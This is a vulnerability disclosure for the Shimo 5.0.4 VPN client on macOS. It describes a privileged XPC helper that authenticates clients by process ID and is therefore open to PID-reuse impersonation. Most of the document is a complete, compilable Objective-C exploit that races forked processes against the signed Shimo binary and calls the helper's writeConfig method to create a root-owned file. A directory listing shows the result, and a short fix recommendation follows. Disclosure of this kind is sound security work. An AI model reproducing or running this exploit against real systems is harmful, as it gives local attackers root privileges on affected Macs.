# Shimo 5.0.4 - Privilege Escalation 

In the Shimo VPN client in version 5.0.4 on macOS, 
the com.feingeist.shimo.helper tool implements an unprotected XPC service that can be abused to create scripts as root on the filesystem, what can lead to privilege escalation. 

When a client connects to the service the incomming connection is verified using `processIdentifier` instead of `audit_token`. Such a mechanism is prone to `PID reuse` attack. During this attack it is possible to impersonate a legitimate client and use all methods offered by `ShimoHelperToolProtocol` protocol. 

Vulnerable method of ShimoHelperTool Class. As shown below, the verification is based on PID, so it is possible to bypass client restrictions: 
```c
/* @class ShimoHelperTool */
-(char)listener:(void *)arg2 shouldAcceptNewConnection:(void *)arg3 {
    r13 = self;
    r15 = [arg2 retain];
    r12 = [arg3 retain];
    rax = [r13 listener];
    rax = [rax retain];
    if (rax == r15) {
            [rax release];
            if (r12 != 0x0) {
                    var_48 = r13;
                    var_50 = r15;
                    var_40 = **_kSecGuestAttributePid;
                    rdx = [r12 processIdentifier]; // VERIFICATION IS BASED ON PID
                    rax = [NSNumber numberWithInt:rdx];
                    rax = [rax retain];
                    r15 = rax;
                    var_38 = rax;
                    rax = [NSDictionary dictionaryWithObjects:rdx forKeys:&var_40 count:0x1];
                    r13 = [rax retain];
                    [r15 release];
                    rax = SecCodeCopyGuestWithAttributes(0x0, r13, 0x0, &var_60);
                    if (rax != 0x0) {
                            r14 = 0x0;
                            syslog$DARWIN_EXTSN(0x3);
                    }
                    else {
                            rax = SecRequirementCreateWithString(@"anchor apple generic and (identifier \"com.feingeist.Shimo\" or identifier \"com.feingeist.Shimo-setapp\") and certificate leaf[subject.OU] = UD5L677SZR", 0x0, &var_58);
                            if (rax == 0x0) {
                                    rcx = &var_68;
                                    rax = SecCodeCheckValidityWithErrors(var_60, 0x0, var_58, rcx);
                                    if (rax != 0x0) {
                                            r14 = 0x0;
                                            syslog$DARWIN_EXTSN(0x3);
                                    }
                                    else {
                                            rax = [NSXPCInterface interfaceWithProtocol:@protocol(ShimoHelperToolProtocol), rcx];
                                            rax = [rax retain];
                                            [r12 setExportedInterface:rax, rcx];
                                            [rax release];
                                            [r12 setExportedObject:var_48, rcx];
                                            [r12 resume];
                                            r14 = 0x1;
                                    }
                            }
                            else {
                                    r14 = 0x0;
                                    syslog$DARWIN_EXTSN(0x3);
                            }
                    }
                    var_30 = **___stack_chk_guard;
                    [r13 release];
                    [r12 release];
                    [var_50 release];
                    if (**___stack_chk_guard == var_30) {
                            rax = r14 & 0xff;
                    }
                    else {
                            rax = __stack_chk_fail();
                    }
            }
            else {
                    rax = sub_10000ea0a();
            }
    }
    else {
            rax = sub_10000ea2d();
    }
    return rax;
}

```

## Exploit code

Following expoit code was used to connect to the vulnerable helper, impresonate a legitimate client using PID reuse attack and execute a mehod `writeConfig: atPath: withReply:`, which allows for writing an arbitrary file at the disk. The file is created and owned by `root` user :
```c
#import <Foundation/Foundation.h>
#include <spawn.h>
#include <signal.h>

// gcc -framework Foundation -framework Security shimo.m -o shimo

static NSString* XPCHelperMachServiceName = @"com.feingeist.shimo.helper";

@protocol ShimoHelperToolProtocol
- (void)setTimeMachineEnabled:(BOOL)arg1 withReply:(void (^)(NSError *))arg2;
- (void)runVpncScript:(NSString *)arg1 withReason:(NSString *)arg2 withReply:(void (^)(NSError *))arg3;
- (void)cleanSystem:(unsigned long long)arg1 withReply:(void (^)(NSError *))arg2;
- (void)cleanKnownHostsForRemoteHost:(NSString *)arg1 withReply:(void (^)(NSError *))arg2;
- (void)unloadKernelExtensions:(unsigned long long)arg1 withReply:(void (^)(NSError *))arg2;
- (void)loadKernelExtensions:(unsigned long long)arg1 withReply:(void (^)(NSError *))arg2;
- (void)configureRoutingWithCommand:(NSString *)arg1 withReply:(void (^)(NSError *, NSString *))arg2;
- (void)terminateRacoonDaemonWithReply:(void (^)(NSError *))arg1;
- (void)reloadRacoonConfigWithReply:(void (^)(NSError *))arg1;
- (void)updateNameServerAddresses:(NSArray *)arg1 searchDomains:(NSArray *)arg2 defaultDomain:(NSString *)arg3 forServiceIdentifier:(NSString *)arg4 withReply:(void (^)(NSError *))arg5;
- (void)deleteConfigAtPath:(NSString *)arg1 withReply:(void (^)(NSError *))arg2;
- (void)writeConfig:(NSString *)arg1 atPath:(NSString *)arg2 withReply:(void (^)(NSError *))arg3;
- (void)disconnectService:(long long)arg1 fromRemoteHost:(NSString *)arg2 withComPort:(unsigned long long)arg3 withPID:(int)arg4 withReply:(void (^)(NSError *))arg5;
- (void)connectOpenConnectWithConfig:(NSString *)arg1 toHost:(NSString *)arg2 withCredentials:(NSString *)arg3 withHash:(NSString *)arg4 withComPort:(unsigned long long)arg5 withReply:(void (^)(NSError *, int))arg6;
- (void)connectRacoonToHost:(NSString *)arg1 withCredentials:(NSDictionary *)arg2 withComPort:(unsigned long long)arg3 withReply:(void (^)(NSError *, int))arg4;
- (void)connectSSHWithConfig:(NSString *)arg1 toHost:(NSString *)arg2 withCredentials:(NSString *)arg3 withComPort:(unsigned long long)arg4 withReply:(void (^)(NSError *, int))arg5;
- (void)connectPPPWithConfig:(NSString *)arg1 withCredentials:(NSDictionary *)arg2 withComPort:(unsigned long long)arg3 requiresRacoon:(BOOL)arg4 withReply:(void (^)(NSError *, int))arg5;
- (void)connectVPNCWithConfig:(NSString *)arg1 withComPort:(unsigned long long)arg2 withReply:(void (^)(NSError *, int))arg3;
- (void)connectOpenVPNWithConfig:(NSString *)arg1 withManagementPort:(unsigned long long)arg2 withReply:(void (^)(NSError *, NSString *))arg3;
- (void)setTmpDirPath:(NSString *)arg1;
- (void)setShimoBundlePath:(NSString *)arg1;
@end

int main(void) {

    #define RACE_COUNT 10
    #define kValid "/Applications/Shimo 2.app/Contents/MacOS/Shimo" // HERE
    extern char **environ;

    int pids[RACE_COUNT];
    for (int i = 0; i < RACE_COUNT; i++)
    {
        int pid = fork();
        if (pid == 0)
        {
        NSString*  _serviceName = XPCHelperMachServiceName;
        NSXPCConnection* _agentConnection = [[NSXPCConnection alloc] initWithMachServiceName:_serviceName options:4096];
        [_agentConnection setRemoteObjectInterface:[NSXPCInterface interfaceWithProtocol:@protocol(ShimoHelperToolProtocol)]];
        [_agentConnection resume];

        id obj = [_agentConnection remoteObjectProxyWithErrorHandler:^(NSError* error)
         {
             (void)error;
             NSLog(@"Connection Failure");
         }];
        NSLog(@"obj: %@", obj);
        NSLog(@"conn: %@", _agentConnection);
        //get FW state
        NSString* sudo_config = @"teststring";
        NSString* sudo_path = @"/Library/Scripts/poc.sh";
        
        // - (void)writeConfig:(NSString *)arg1 atPath:(NSString *)arg2 withReply:(void (^)(NSError *))arg3;
        [obj writeConfig:sudo_config atPath:sudo_path withReply:^(NSError * err){
             NSLog(@"Response: %@", err);
                 }];
 
        NSLog(@"Done");
        // start PID reuse
        char target_binary[] = kValid;
        char *target_argv[] = {target_binary, NULL};
        posix_spawnattr_t attr;
        posix_spawnattr_init(&attr);
        short flags;
        posix_spawnattr_getflags(&attr, &flags);
        flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
        posix_spawnattr_setflags(&attr, flags);
        posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
        }
        printf("forked %d\n", pid);
        pids[i] = pid;
    }
    // keep the child processes alive
    sleep(10);
    
    cleanup:
    for (int i = 0; i < RACE_COUNT; i++)
    {
        pids[i] && kill(pids[i], 9);
    }
}
```




## POC
Once the exploit code is executed a file poc.sh has been created
```
user@catalina1 exploit % ls -la /Library/Scripts
total 8
drwxr-xr-x  11 root  wheel   352 Apr  1 04:40 .
drwxr-xr-x  66 root  wheel  2112 Aug 30  2021 ..
drwxr-xr-x  10 root  wheel   320 Aug 24  2019 ColorSync
drwxr-xr-x  15 root  wheel   480 Aug 24  2019 Folder Action Scripts
drwxr-xr-x   6 root  wheel   192 Aug 24  2019 Folder Actions
drwxr-xr-x   7 root  wheel   224 Sep  3  2019 Font Book
drwxr-xr-x   8 root  wheel   256 Aug 24  2019 Printing Scripts
drwxr-xr-x  14 root  wheel   448 Aug 24  2019 Script Editor Scripts
drwxr-xr-x   7 root  wheel   224 Aug 24  2019 UI Element Scripts
drwxr-xr-x   5 root  wheel   160 Sep 10  2019 VoiceOver
-rw-r--r--@  1 root  wheel    10 Apr  1 04:40 poc.sh
```


## Recommendation 
Use the audit token instead of process identifier to create the SecCode references. 
[Example Resource](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)

